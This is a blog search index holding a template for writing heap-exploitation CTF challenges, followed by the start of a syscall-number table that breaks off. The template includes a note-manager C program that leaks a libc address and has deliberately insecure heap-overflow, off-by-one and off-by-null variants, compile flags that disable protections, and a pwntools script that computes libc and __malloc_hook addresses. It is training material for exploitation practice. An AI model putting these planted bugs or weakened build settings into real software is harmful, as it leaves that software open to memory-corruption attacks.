<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>heap题出题模板</title>
    <link href="/2025/04/21/heap%E9%A2%98%E5%87%BA%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
    <url>/2025/04/21/heap%E9%A2%98%E5%87%BA%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h3 id="食用方法：编译后用示例脚本开始调试，具体漏洞要在源码中启用"><a href="#食用方法：编译后用示例脚本开始调试，具体漏洞要在源码中启用" class="headerlink" title="食用方法：编译后用示例脚本开始调试，具体漏洞要在源码中启用"></a>食用方法：编译后用示例脚本开始调试，具体漏洞要在源码中启用</h3><blockquote><p>gcc -o init init.c <br>  -Wl,–dynamic-linker&#x3D;.&#x2F;ld-2.23.so <br>  -Wl,-rpath&#x3D;’$ORIGIN’ <br>  -L. -l:libc.so.6 <br>  -no-pie <br>  -fno-stack-protector <br>  -Wl,-z,norelro <br>  -D_FORTIFY_SOURCE&#x3D;0 <br>  -z noexecstack</p></blockquote><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> *heap_list[<span class="hljs-number">16</span>];<br><span class="hljs-type">int</span> heap_list_size[<span class="hljs-number">16</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(heap_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(heap_list));<br>    <span class="hljs-built_in">memset</span>(heap_list_size, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(heap_list_size));<br>&#125;   <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1. Add a new note\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2. Delete a note\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3. Edit a note\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4. Check the note\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5. Exit\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!heap_list[i])<br>        &#123;    <br>            <span class="hljs-type">char</span> size[<span class="hljs-number">8</span>];<br>            <span class="hljs-type">char</span> *note;<br>            <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>                read(<span class="hljs-number">0</span>, size, <span class="hljs-number">4</span>);<br>                heap_list_size[i] = atoi(size);<br>                <span class="hljs-keyword">if</span>(heap_list_size[i] &lt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid size&quot;</span>);<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    note = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(heap_list_size[i]);<br>                    heap_list[i] = (<span class="hljs-type">int</span> *)note;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(heap_list_size[i] &gt; <span class="hljs-number">0x1500</span>) <br>                &#123;<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Size is too big!&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// char buffer[size_num];</span><br>            <span class="hljs-comment">// memset(buffer, 0, sizeof(buffer));</span><br>            <span class="hljs-keyword">if</span>(!note)<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory allocation failed!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, note, heap_list_size[i]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note %d added successfully!\n&quot;</span>,i);<br>            <span class="hljs-comment">// off by null</span><br>            <span class="hljs-comment">// strcpy(note, buffer);</span><br>            <span class="hljs-comment">// off by one</span><br>            <span class="hljs-comment">// read(0, buffer, size_num+1);</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i &gt;= <span class="hljs-number">15</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Heap is full!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_note</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">int</span> index_num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>    index_num = atoi(buf);<br>    <span class="hljs-keyword">if</span>(index_num &lt; <span class="hljs-number">0</span> || index_num &gt; <span class="hljs-number">15</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(heap_list[index_num])<br>    &#123;<br>        <span class="hljs-built_in">free</span>(heap_list[index_num]);<br>        heap_list[index_num] = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// UAF</span><br>        heap_list_size[index_num] = <span class="hljs-number">0</span>;<span class="hljs-comment">//uaf</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note deleted successfully!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Free corrupted!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_note</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter the index of the note you want to edit:&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">int</span> index_num;<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>    index_num = atoi(buf);<br>    <span class="hljs-keyword">if</span>(index_num &lt; <span class="hljs-number">0</span> || index_num &gt; <span class="hljs-number">15</span>|| heap_list[index_num] == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">size_t</span> current_size = malloc_usable_size(heap_list[index_num]);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter the new content:&quot;</span>);<br>        read(<span class="hljs-number">0</span>, heap_list[index_num], current_size<span class="hljs-number">-1</span>);<br>        ((<span class="hljs-type">char</span> *)heap_list[index_num])[current_size<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">// 堆溢出</span><br>    <span class="hljs-comment">// else</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     puts(&quot;Please enter the length of item name:&quot;);</span><br>    <span class="hljs-comment">//     char size[8];</span><br>    <span class="hljs-comment">//     int size_num;</span><br>    <span class="hljs-comment">//     read(0, size, 4);</span><br>    <span class="hljs-comment">//     size_num = atoi(size);</span><br>    <span class="hljs-comment">//     if (size_num &lt;= 0)</span><br>    <span class="hljs-comment">//     &#123;</span><br>    <span class="hljs-comment">//     puts(&quot;Invalid size&quot;);</span><br>    <span class="hljs-comment">//     return;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     puts(&quot;Please enter the new content:&quot;);</span><br>    <span class="hljs-comment">//     read(0, heap_list[index_num], size_num);</span><br>    <span class="hljs-comment">//     puts(&quot;Note edited successfully!&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// 堆溢出2</span><br>    <span class="hljs-comment">//     else</span><br>    <span class="hljs-comment">//     &#123;</span><br>    <span class="hljs-comment">//         char ch;</span><br>    <span class="hljs-comment">//         int offset = 0;</span><br>    <span class="hljs-comment">//         puts(&quot;Please enter the new content:&quot;);</span><br>    <span class="hljs-comment">//         while (1)</span><br>    <span class="hljs-comment">//         &#123;</span><br>    <span class="hljs-comment">//             if (read(0, &amp;ch, 1) &lt;= 0)</span><br>    <span class="hljs-comment">//                 break;</span><br>    <span class="hljs-comment">//             if (ch == &#x27;\n&#x27;)</span><br>    <span class="hljs-comment">//                 break;</span><br>    <span class="hljs-comment">//             ((char *)heap_list[index_num])[offset++] = ch;</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//         puts(&quot;Note edited successfully!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">//    off-by-one:</span><br>    <span class="hljs-comment">//     else</span><br>    <span class="hljs-comment">//     &#123;</span><br>    <span class="hljs-comment">//      puts(&quot;Please enter the new content:&quot;);</span><br>    <span class="hljs-comment">//      read(0, heap_list[index_num], size_num+1);</span><br>    <span class="hljs-comment">//      puts(&quot;Note edited successfully!&quot;);</span><br>    <span class="hljs-comment">//      &#125;  </span><br><br>    <span class="hljs-comment">//    off-by-null:</span><br>        <span class="hljs-comment">// else</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//  puts(&quot;Please enter the new content:&quot;);</span><br>        <span class="hljs-comment">//  read(0, heap_list[index_num], heap_list_size[index_num]);</span><br>        <span class="hljs-comment">//  ((char *)heap_list[index_num])[heap_list_size[index_num]] = &#x27;\0&#x27;;</span><br>        <span class="hljs-comment">//  puts(&quot;Note edited successfully!&quot;);</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">check_note</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter the index of the note you want to edit:&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">int</span> index_num;<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>    index_num = atoi(buf);<br>    <span class="hljs-keyword">if</span> (index_num &lt; <span class="hljs-number">0</span> || index_num &gt; <span class="hljs-number">15</span>|| heap_list[index_num] == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note %d: %s\n&quot;</span>, index_num, (<span class="hljs-type">char</span> *)heap_list[index_num]);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    init();<br>    <span class="hljs-type">char</span> choice[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the note management system!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gift %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        menu();<br>        read(<span class="hljs-number">0</span>, choice, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">switch</span> (atoi(choice))<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            add_note();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            delete_note();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            edit_note();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            check_note();<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span>  <span class="hljs-number">6</span>:<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(heap_list[i])<br>                &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_list[%d]: %p\n&quot;</span>, i, heap_list[i]);<br>                    <span class="hljs-comment">// printf(&quot;heap_list_size[%d]: %d\n&quot;, i, heap_list_size[i]);</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>r=process(<span class="hljs-string">&#x27;./init&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(r, &#x27;b *addr&#x27;)</span><br><br>heap_list=<span class="hljs-number">0x4040A0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    r.sendafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    r.sendafter(<span class="hljs-string">b&#x27;edit:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    r.sendafter(<span class="hljs-string">b&#x27;edit:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():<br>    r.sendlineafter(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br><br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>puts_addr=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;puts_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base=puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>malloc_hook=libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;__malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><span class="hljs-comment">#操作区</span><br><br><br><br><br><br>r.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sample</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统调用号</title>
    <link href="/2025/04/20/%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/20/%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span 